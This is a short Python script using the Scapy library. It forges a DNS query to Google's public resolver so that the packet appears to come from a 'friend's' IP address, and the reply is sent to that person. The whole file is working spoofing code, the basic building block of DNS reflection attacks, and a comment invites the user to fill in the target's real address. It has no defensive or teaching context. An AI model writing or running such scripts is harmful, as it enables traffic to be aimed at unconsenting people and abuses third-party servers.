from scapy.all import *

# Replace with your friend's actual IP address
friend_ip = "192.168.0.191"  

# DNS server to query (Google DNS as example)
dns_server = "8.8.8.8"

# Domain to resolve
query_domain = "example.com"

# Construct the DNS query packet
dns_query = IP(src=friend_ip, dst=dns_server) / \
            UDP(sport=RandShort(), dport=53) / \
            DNS(rd=1, qd=DNSQR(qname=query_domain, qtype="A"))

# Send the spoofed DNS request
send(dns_query, verbose=1)
